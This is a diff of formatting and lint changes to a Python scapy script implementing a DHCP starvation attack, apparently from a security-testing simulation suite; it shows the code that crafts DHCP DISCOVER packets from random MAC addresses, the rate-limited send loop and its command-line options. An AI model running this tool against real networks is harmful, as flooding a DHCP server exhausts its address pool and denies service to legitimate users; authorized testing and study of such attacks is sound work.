@@ -15,32 +15,33 @@ License: Proprietary
 Version: 1.0.0
 """
 
+import argparse
 import os
 import sys
 import time
-import random
-import argparse
-from typing import Dict, Any
+from typing import Any
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
 try:
     from logger import get_logger
 except ImportError:
     import logging
+
     def get_logger(name):
         logger = logging.getLogger(name)
         if not logger.handlers:
             handler = logging.StreamHandler()
-            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+            formatter = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
             handler.setFormatter(formatter)
             logger.addHandler(handler)
             logger.setLevel(logging.INFO)
         return logger
 
+
 logger = get_logger(__name__)
 
 try:
-    from scapy.all import Ether, IP, UDP, BOOTP, DHCP, RandMAC, sendp, conf
+    from scapy.all import BOOTP, DHCP, IP, UDP, Ether, RandMAC, conf, sendp
 except ImportError:
     logger.error("This script requires scapy. Install: pip install scapy")
     sys.exit(1)
@@ -72,16 +73,16 @@ class DHCPStarvationAttack:
         bootp = BOOTP(chaddr=[int(x, 16) for x in mac.split(":")])
         dhcp = DHCP(options=[("message-type", "discover"), "end"])
 
-        packet = ethernet/ip/udp/bootp/dhcp
+        packet = ethernet / ip / udp / bootp / dhcp
 
         if self.verbose:
             logger.debug(f"Created DHCP DISCOVER from MAC: {mac}")
 
         return packet
 
-    def execute(self) -> Dict[str, Any]:
+    def execute(self) -> dict[str, Any]:
         """Execute the DHCP starvation attack."""
-        logger.info(f"Starting DHCP starvation attack")
+        logger.info("Starting DHCP starvation attack")
         logger.info(f"Sending {self.count} requests at {self.rate}/sec")
 
         start_time = time.time()
@@ -109,12 +110,12 @@ class DHCPStarvationAttack:
             stats = {
                 "requests_sent": self.requests_sent,
                 "duration_seconds": duration,
-                "actual_rate": self.requests_sent / duration if duration > 0 else 0
+                "actual_rate": self.requests_sent / duration if duration > 0 else 0,
             }
             self._print_summary(stats)
             return stats
 
-    def _print_summary(self, stats: Dict[str, Any]):
+    def _print_summary(self, stats: dict[str, Any]):
         """Print attack summary."""
         logger.info("=" * 50)
         logger.info("DHCP Starvation Attack Summary")
@@ -129,14 +130,16 @@ def parse_arguments() -> argparse.Namespace:
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser(
         description="DHCP Starvation Attack Simulation",
-        epilog="IMPORTANT: Use only for authorized security testing."
+        epilog="IMPORTANT: Use only for authorized security testing.",
     )
 
     parser.add_argument("-i", "--interface", required=True, help="Network interface")
-    parser.add_argument("-c", "--count", type=int, default=100,
-                       help="Number of DHCP requests (default: 100)")
-    parser.add_argument("-r", "--rate", type=int, default=10,
-                       help="Requests per second (default: 10)")
+    parser.add_argument(
+        "-c", "--count", type=int, default=100, help="Number of DHCP requests (default: 100)"
+    )
+    parser.add_argument(
+        "-r", "--rate", type=int, default=10, help="Requests per second (default: 10)"
+    )
     parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
 
     return parser.parse_args()
@@ -152,10 +155,7 @@ def main():
     try:
         args = parse_arguments()
         attack = DHCPStarvationAttack(
-            interface=args.interface,
-            count=args.count,
-            rate=args.rate,
-            verbose=args.verbose
+            interface=args.interface, count=args.count, rate=args.rate, verbose=args.verbose
         )
         attack.execute()
     except KeyboardInterrupt:
